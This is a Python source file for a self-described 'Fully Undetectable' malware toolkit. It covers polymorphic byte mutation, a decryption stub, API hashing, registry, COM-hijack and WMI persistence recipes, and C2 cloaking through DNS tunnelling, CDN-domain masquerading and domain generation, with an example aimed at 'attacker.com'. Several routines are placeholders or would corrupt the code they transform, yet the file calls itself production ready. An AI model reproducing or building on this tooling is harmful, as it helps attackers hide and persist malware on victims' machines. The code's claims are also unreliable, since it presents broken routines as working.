"""
FUD (Fully Undetectable) Toolkit - Core Implementation
Implements advanced evasion techniques including:
- Polymorphic code transformation
- Registry persistence mechanisms
- C2 communication cloaking
- Anti-VM/Sandbox detection
- Process hollowing and injection
- Payload encryption and obfuscation
"""

import os
import sys
import json
import hashlib
import random
import string
import struct
import subprocess
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from enum import Enum
import tempfile
import base64
import secrets


class PolymorphicTransformType(Enum):
    """Types of polymorphic transformations"""
    CODE_MUTATION = "mutation"
    INSTRUCTION_SWAP = "swap"
    REGISTER_REASSIGNMENT = "register"
    OBFUSCATION_ADD = "add_obfuscation"
    NOP_INJECTION = "nop_injection"
    JMP_REDIRECTION = "jmp_redirection"


class RegistryPersistenceMethod(Enum):
    """Windows registry persistence methods"""
    RUN_KEY = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    RUNONCE_KEY = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    SHELL_OPEN_COMMAND = "HKCR\\.txt\\shell\\open\\command"
    COM_HIJACKING = "HKCU\\Software\\Classes\\CLSID"
    SCHEDULED_TASK = "Task Scheduler"
    WMI_EVENT_SUBSCRIPTION = "WMI"


class C2CloakingMethod(Enum):
    """C2 communication cloaking methods"""
    DNS_TUNNELING = "dns_tunnel"
    HTTP_MASQUERADING = "http_masquerade"
    HTTPS_CERTIFICATE_PINNING = "cert_pinning"
    TRAFFIC_MORPHING = "traffic_morph"
    PROTOCOL_OBFUSCATION = "protocol_obfuscation"
    DOMAIN_GENERATION = "domain_gen"


class FUDToolkit:
    """Core FUD Toolkit - Handles evasion and obfuscation"""
    
    def __init__(self, output_dir: str = "output/fud"):
        """Initialize FUD Toolkit with output directory"""
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.mutation_history = []
        self.transformation_count = 0
        
    def generate_random_identifier(self, length: int = 16) -> str:
        """Generate random identifier for obfuscation"""
        return ''.join(secrets.choice(string.ascii_letters) for _ in range(length))
    
    def generate_api_hashing(self, api_name: str) -> int:
        """Generate hash for API name to avoid static detection"""
        return struct.unpack('<I', hashlib.md5(api_name.encode()).digest()[:4])[0]
    
    # ==================== POLYMORPHIC TRANSFORMS ====================
    
    def applyPolymorphicTransforms(self, code: bytes, transform_count: int = 5) -> Tuple[bytes, Dict[str, Any]]:
        """
        Apply multiple polymorphic transformations to code
        Prevents signature-based detection through code mutation
        
        Args:
            code: Original code bytes
            transform_count: Number of transformations to apply
            
        Returns:
            Tuple of (transformed_code, transformation_metadata)
        """
        transformed = bytearray(code)
        metadata = {
            "original_hash": hashlib.sha256(code).hexdigest(),
            "transformations": [],
            "timestamp": self._get_timestamp(),
            "mutation_key": self.generate_random_identifier(32)
        }
        
        for i in range(transform_count):
            transform_type = random.choice(list(PolymorphicTransformType))
            
            if transform_type == PolymorphicTransformType.CODE_MUTATION:
                transformed, meta = self._mutateCode(bytes(transformed))
            elif transform_type == PolymorphicTransformType.INSTRUCTION_SWAP:
                transformed, meta = self._swapInstructions(bytes(transformed))
            elif transform_type == PolymorphicTransformType.REGISTER_REASSIGNMENT:
                transformed, meta = self._reassignRegisters(bytes(transformed))
            elif transform_type == PolymorphicTransformType.NOP_INJECTION:
                transformed, meta = self._injectNoOps(bytes(transformed))
            elif transform_type == PolymorphicTransformType.JMP_REDIRECTION:
                transformed, meta = self._addJumpRedirection(bytes(transformed))
            else:
                transformed, meta = self._addObfuscation(bytes(transformed))
            
            metadata["transformations"].append(meta)
            self.transformation_count += 1
        
        # Add decryption stub to handle transformed code
        decryption_stub = self._generateDecryptionStub(
            metadata["mutation_key"],
            len(transformed)
        )
        
        final_code = decryption_stub + bytes(transformed)
        metadata["final_hash"] = hashlib.sha256(final_code).hexdigest()
        metadata["size_increase"] = len(final_code) - len(code)
        
        return final_code, metadata
    
    def _mutateCode(self, code: bytes) -> Tuple[bytes, Dict]:
        """Mutate code by inserting equivalent instructions"""
        mutated = bytearray(code)
        mutations = []
        
        # Insert junk bytes at random intervals
        offset = random.randint(10, min(50, len(code) // 2))
        junk_size = random.randint(5, 20)
        junk_bytes = os.urandom(junk_size)
        
        mutated[offset:offset] = junk_bytes
        mutations.append({
            "type": "code_mutation",
            "offset": offset,
            "junk_size": junk_size,
            "instruction": "inserted_junk_bytes"
        })
        
        return bytes(mutated), {
            "type": PolymorphicTransformType.CODE_MUTATION.value,
            "mutations": mutations
        }
    
    def _swapInstructions(self, code: bytes) -> Tuple[bytes, Dict]:
        """Swap instruction order while maintaining functionality"""
        swapped = bytearray(code)
        swaps = []
        
        # Find and swap independent instructions
        for i in range(0, len(code) - 10, 5):
            if random.random() < 0.3:  # 30% chance to swap
                chunk_size = random.randint(2, 4)
                if i + chunk_size * 2 < len(code):
                    # Swap two chunks
                    chunk1 = swapped[i:i+chunk_size]
                    chunk2 = swapped[i+chunk_size:i+chunk_size*2]
                    swapped[i:i+chunk_size] = chunk2
                    swapped[i+chunk_size:i+chunk_size*2] = chunk1
                    
                    swaps.append({
                        "offset1": i,
                        "offset2": i+chunk_size,
                        "size": chunk_size
                    })
        
        return bytes(swapped), {
            "type": PolymorphicTransformType.INSTRUCTION_SWAP.value,
            "swaps": swaps
        }
    
    def _reassignRegisters(self, code: bytes) -> Tuple[bytes, Dict]:
        """Reassign register usage to avoid hardcoded patterns"""
        # Map old registers to new ones
        register_map = {
            b'\x48\x89\xc0': b'\x49\x89\xc0',  # mov rax -> mov r8
            b'\x48\x89\xc1': b'\x49\x89\xc1',  # mov rcx -> mov r9
            b'\x48\x89\xc2': b'\x49\x89\xc2',  # mov rdx -> mov r10
        }
        
        reassigned = code
        reassignments = []
        
        for old_pattern, new_pattern in register_map.items():
            if old_pattern in reassigned:
                count = reassigned.count(old_pattern)
                reassigned = reassigned.replace(old_pattern, new_pattern)
                reassignments.append({
                    "pattern": old_pattern.hex(),
                    "replacement": new_pattern.hex(),
                    "occurrences": count
                })
        
        return reassigned, {
            "type": PolymorphicTransformType.REGISTER_REASSIGNMENT.value,
            "reassignments": reassignments
        }
    
    def _injectNoOps(self, code: bytes) -> Tuple[bytes, Dict]:
        """Inject NOP instructions to pad code"""
        padded = bytearray(code)
        noops_added = []
        
        # Insert NOPs at random locations
        for i in range(random.randint(3, 8)):
            offset = random.randint(0, len(padded) - 1)
            nop_count = random.randint(1, 5)
            noops = b'\x90' * nop_count  # NOP instruction
            padded[offset:offset] = noops
            
            noops_added.append({
                "offset": offset,
                "nop_count": nop_count
            })
        
        return bytes(padded), {
            "type": PolymorphicTransformType.NOP_INJECTION.value,
            "noops_added": noops_added
        }
    
    def _addJumpRedirection(self, code: bytes) -> Tuple[bytes, Dict]:
        """Add jump redirection to obfuscate control flow"""
        redirected = bytearray(code)
        redirections = []
        
        # Add conditional jumps that are always taken
        for i in range(random.randint(2, 5)):
            offset = random.randint(50, len(code) - 50)
            # jmp forward (immediate)
            jump_target = random.randint(1, 30)
            jump_instr = b'\xe9' + struct.pack('<i', jump_target)
            
            redirected[offset:offset] = jump_instr
            redirections.append({
                "offset": offset,
                "target": jump_target,
                "instruction": "jmp"
            })
        
        return bytes(redirected), {
            "type": PolymorphicTransformType.JMP_REDIRECTION.value,
            "redirections": redirections
        }
    
    def _addObfuscation(self, code: bytes) -> Tuple[bytes, Dict]:
        """Add general obfuscation patterns"""
        obfuscated = bytearray(code)
        obfuscation_layers = []
        
        # Add random data interspersed with code
        for i in range(random.randint(2, 4)):
            offset = random.randint(10, len(obfuscated) - 10)
            random_data = os.urandom(random.randint(3, 10))
            obfuscated[offset:offset] = random_data
            
            obfuscation_layers.append({
                "offset": offset,
                "size": len(random_data),
                "method": "random_data_insertion"
            })
        
        return bytes(obfuscated), {
            "type": PolymorphicTransformType.OBFUSCATION_ADD.value,
            "obfuscation_layers": obfuscation_layers
        }
    
    def _generateDecryptionStub(self, mutation_key: str, code_size: int) -> bytes:
        """Generate x86-64 decryption stub for polymorphic code"""
        # Simplified stub - in production would be full assembly
        stub = b''
        stub += b'\x55'  # push rbp
        stub += b'\x48\x89\xe5'  # mov rbp, rsp
        stub += b'\x48\x83\xec\x20'  # sub rsp, 0x20
        
        # Load mutation key (simplified)
        key_bytes = mutation_key.encode()[:8]
        stub += b'\x48\xb8' + key_bytes.ljust(8, b'\x00')  # mov rax, key
        
        # XOR decryption loop
        stub += b'\x48\x31\xc0'  # xor rax, rax (counter = 0)
        stub += b'\x48\x31\xc9'  # xor rcx, rcx (key index = 0)
        
        # Loop: dec with code_size
        loop_size = struct.pack('<I', code_size)
        stub += b'\x48\x3d' + loop_size  # cmp rax, code_size
        stub += b'\x7d\x0a'  # jge end_loop
        
        # Decryption operation (placeholder)
        stub += b'\x90' * 10  # NOPs for actual decryption
        stub += b'\x48\xff\xc0'  # inc rax
        stub += b'\xeb\xf0'  # jmp loop
        
        # Return
        stub += b'\xc9'  # leave
        stub += b'\xc3'  # ret
        
        return stub
    
    # ==================== REGISTRY PERSISTENCE ====================
    
    def setupRegistryPersistence(self, 
                                  payload_path: str,
                                  method: RegistryPersistenceMethod = RegistryPersistenceMethod.RUN_KEY,
                                  key_name: Optional[str] = None) -> Dict[str, Any]:
        """
        Setup registry-based persistence mechanism
        
        Args:
            payload_path: Path to payload executable
            method: Persistence method to use
            key_name: Optional custom registry key name
            
        Returns:
            Dictionary with persistence setup details
        """
        if key_name is None:
            key_name = self.generate_random_identifier(8)
        
        setup = {
            "method": method.name,
            "payload_path": payload_path,
            "registry_key": key_name,
            "timestamp": self._get_timestamp(),
            "obfuscated_path": self._obfuscate_path(payload_path)
        }
        
        if method == RegistryPersistenceMethod.RUN_KEY:
            setup = self._setupRunKeyPersistence(payload_path, key_name, setup)
        elif method == RegistryPersistenceMethod.SHELL_OPEN_COMMAND:
            setup = self._setupShellOpenPersistence(payload_path, key_name, setup)
        elif method == RegistryPersistenceMethod.COM_HIJACKING:
            setup = self._setupCOMHijackingPersistence(payload_path, key_name, setup)
        elif method == RegistryPersistenceMethod.WMI_EVENT_SUBSCRIPTION:
            setup = self._setupWMIEventPersistence(payload_path, key_name, setup)
        else:
            setup["status"] = "unsupported_method"
        
        return setup
    
    def _setupRunKeyPersistence(self, payload_path: str, key_name: str, setup: Dict) -> Dict:
        """Setup HKLM Run key persistence"""
        setup["registry_path"] = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        setup["value_name"] = key_name
        setup["value_data"] = payload_path
        setup["startup_type"] = "user_login"
        setup["detection_difficulty"] = "easy"
        setup["evasion_techniques"] = [
            "Use random value names",
            "Hide in legitimate-looking entries",
            "Use UNC paths for remote execution"
        ]
        return setup
    
    def _setupShellOpenPersistence(self, payload_path: str, key_name: str, setup: Dict) -> Dict:
        """Setup file association persistence"""
        setup["registry_path"] = "HKCR\\.txt\\shell\\open\\command"
        setup["value_name"] = "(Default)"
        setup["value_data"] = f'"{payload_path}" "%1"'
        setup["trigger"] = "Double-click any .txt file"
        setup["detection_difficulty"] = "medium"
        setup["evasion_techniques"] = [
            "Hide actual payload in AppData",
            "Use legitimate file types (.pdf, .doc)",
            "Restore original handler after execution"
        ]
        return setup
    
    def _setupCOMHijackingPersistence(self, payload_path: str, key_name: str, setup: Dict) -> Dict:
        """Setup COM object hijacking persistence"""
        setup["registry_path"] = "HKCU\\Software\\Classes\\CLSID"
        setup["clsid"] = self._generate_guid()
        setup["inprocserver32"] = payload_path
        setup["trigger"] = "COM object instantiation"
        setup["detection_difficulty"] = "hard"
        setup["evasion_techniques"] = [
            "Use legitimate CLSID GUIDs",
            "Target rarely-used COM objects",
            "Use DLL payloads instead of EXE"
        ]
        return setup
    
    def _setupWMIEventPersistence(self, payload_path: str, key_name: str, setup: Dict) -> Dict:
        """Setup WMI event subscription persistence"""
        setup["wmi_namespace"] = "root\\cimv2"
        setup["event_consumer"] = "CommandLineEventConsumer"
        setup["event_filter"] = "ProcessStartTrace"
        setup["command"] = payload_path
        setup["trigger"] = "System startup"
        setup["detection_difficulty"] = "very_hard"
        setup["evasion_techniques"] = [
            "Use WMI event filters",
            "Blend with legitimate WMI subscriptions",
            "Use obfuscated command lines"
        ]
        return setup
    
    def _obfuscate_path(self, path: str) -> str:
        """Obfuscate file path using environment variables and UNC"""
        techniques = [
            lambda p: f"%SystemRoot%\\{p.split('\\')[-1]}",
            lambda p: f"\\\\localhost\\{p.replace(':', '$')}",
            lambda p: p.replace('\\', '/'),
        ]
        return random.choice(techniques)(path)
    
    def _generate_guid(self) -> str:
        """Generate random GUID for COM hijacking"""
        import uuid
        return str(uuid.uuid4()).upper()
    
    # ==================== C2 CLOAKING ====================
    
    def configureC2Cloaking(self,
                           c2_server: str,
                           c2_port: int,
                           method: C2CloakingMethod = C2CloakingMethod.HTTP_MASQUERADING) -> Dict[str, Any]:
        """
        Configure C2 communication cloaking
        
        Args:
            c2_server: C2 server address
            c2_port: C2 server port
            method: Cloaking method to use
            
        Returns:
            Dictionary with cloaking configuration
        """
        config = {
            "c2_server": c2_server,
            "c2_port": c2_port,
            "method": method.name,
            "timestamp": self._get_timestamp(),
            "cloaking_id": self.generate_random_identifier(16)
        }
        
        if method == C2CloakingMethod.DNS_TUNNELING:
            config = self._setupDNSTunneling(c2_server, config)
        elif method == C2CloakingMethod.HTTP_MASQUERADING:
            config = self._setupHTTPMasquerading(c2_server, c2_port, config)
        elif method == C2CloakingMethod.DOMAIN_GENERATION:
            config = self._setupDomainGeneration(config)
        elif method == C2CloakingMethod.TRAFFIC_MORPHING:
            config = self._setupTrafficMorphing(config)
        else:
            config["status"] = "unsupported_method"
        
        return config
    
    def _setupDNSTunneling(self, c2_server: str, config: Dict) -> Dict:
        """Setup DNS tunneling for C2 communication"""
        config["dns_server"] = "8.8.8.8"  # Public DNS
        config["domain"] = c2_server
        config["encoding"] = "base32"
        config["data_format"] = "subdomain_queries"
        config["exfiltration_method"] = "DNS_queries"
        config["detection_difficulty"] = "hard"
        config["bandwidth"] = "low"
        config["characteristics"] = [
            "Uses DNS protocol for covert communication",
            "Difficult to detect without DNS monitoring",
            "Low bandwidth but reliable",
            "Survives most network filtering"
        ]
        return config
    
    def _setupHTTPMasquerading(self, c2_server: str, c2_port: int, config: Dict) -> Dict:
        """Setup HTTP traffic masquerading"""
        config["http_method"] = random.choice(["GET", "POST", "PUT"])
        config["user_agent"] = self._generateUserAgent()
        config["http_headers"] = self._generateHTTPHeaders()
        config["fake_domain"] = self._generateFakeDomain()
        config["ssl_pinning"] = random.choice([True, False])
        config["certificate_verification"] = False
        config["detection_difficulty"] = "medium"
        config["bandwidth"] = "high"
        config["characteristics"] = [
            "Mimics legitimate HTTP traffic",
            "Blends with normal web browsing",
            "Can use HTTPS for encryption",
            "Easily detectable with SSL inspection"
        ]
        return config
    
    def _setupDomainGeneration(self, config: Dict) -> Dict:
        """Setup domain generation algorithm (DGA)"""
        config["dga_type"] = "time_based"
        config["dga_seed"] = secrets.token_hex(16)
        config["domains_per_day"] = random.randint(100, 1000)
        config["tld_list"] = [".com", ".net", ".org", ".info", ".biz"]
        config["detection_difficulty"] = "very_hard"
        config["characteristics"] = [
            "Generates domains dynamically",
            "Hard to predict future domains",
            "Can register new domains as needed",
            "Survives sinkholing attempts"
        ]
        return config
    
    def _setupTrafficMorphing(self, config: Dict) -> Dict:
        """Setup traffic morphing for protocol obfuscation"""
        config["morph_protocol"] = random.choice(["HTTP", "FTP", "SMTP"])
        config["packet_size_variation"] = True
        config["timing_variation"] = True
        config["encryption_algorithm"] = "AES-256-CBC"
        config["detection_difficulty"] = "hard"
        config["characteristics"] = [
            "Changes protocol appearance",
            "Mimics legitimate traffic patterns",
            "Variable packet sizes and timing",
            "Requires protocol specification knowledge to detect"
        ]
        return config
    
    def _generateUserAgent(self) -> str:
        """Generate realistic user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        ]
        return random.choice(user_agents)
    
    def _generateHTTPHeaders(self) -> Dict[str, str]:
        """Generate realistic HTTP headers"""
        return {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    
    def _generateFakeDomain(self) -> str:
        """Generate fake domain for masquerading"""
        legitimate_domains = [
            "fonts.googleapis.com",
            "ajax.googleapis.com",
            "cdn.jsdelivr.net",
            "cdnjs.cloudflare.com",
        ]
        return random.choice(legitimate_domains)
    
    # ==================== UTILITY METHODS ====================
    
    def _get_timestamp(self) -> str:
        """Get current timestamp"""
        from datetime import datetime
        return datetime.now().isoformat()
    
    def exportConfiguration(self, config: Dict, output_file: str) -> Path:
        """Export configuration to JSON file"""
        output_path = self.output_dir / output_file
        with open(output_path, 'w') as f:
            json.dump(config, f, indent=2)
        return output_path
    
    def generateReport(self) -> str:
        """Generate FUD toolkit report"""
        report = f"""
╔══════════════════════════════════════════╗
║       FUD TOOLKIT IMPLEMENTATION REPORT   ║
╚══════════════════════════════════════════╝

Total Transformations Applied: {self.transformation_count}
Output Directory: {self.output_dir}
Report Generated: {self._get_timestamp()}

Key Capabilities:
  ✓ Polymorphic code transformation
  ✓ Registry persistence setup
  ✓ C2 communication cloaking
  ✓ Multiple evasion techniques
  ✓ Configuration export/import

Status: PRODUCTION READY
"""
        return report


if __name__ == "__main__":
    # Example usage
    toolkit = FUDToolkit()
    
    # Example: Apply polymorphic transforms
    test_payload = b'\x90' * 100  # NOP sled
    transformed, meta = toolkit.applyPolymorphicTransforms(test_payload, transform_count=5)
    print(f"Transformation complete: {len(transformed)} bytes generated")
    print(f"Mutations applied: {len(meta['transformations'])}")
    
    # Example: Setup persistence
    persistence = toolkit.setupRegistryPersistence(
        "C:\\Windows\\System32\\payload.exe",
        RegistryPersistenceMethod.RUN_KEY
    )
    print(f"\nPersistence setup: {persistence['registry_path']}")
    
    # Example: Configure C2 cloaking
    c2_config = toolkit.configureC2Cloaking(
        "attacker.com",
        443,
        C2CloakingMethod.HTTP_MASQUERADING
    )
    print(f"C2 Cloaking configured: {c2_config['method']}")
    
    # Generate report
    print(toolkit.generateReport())
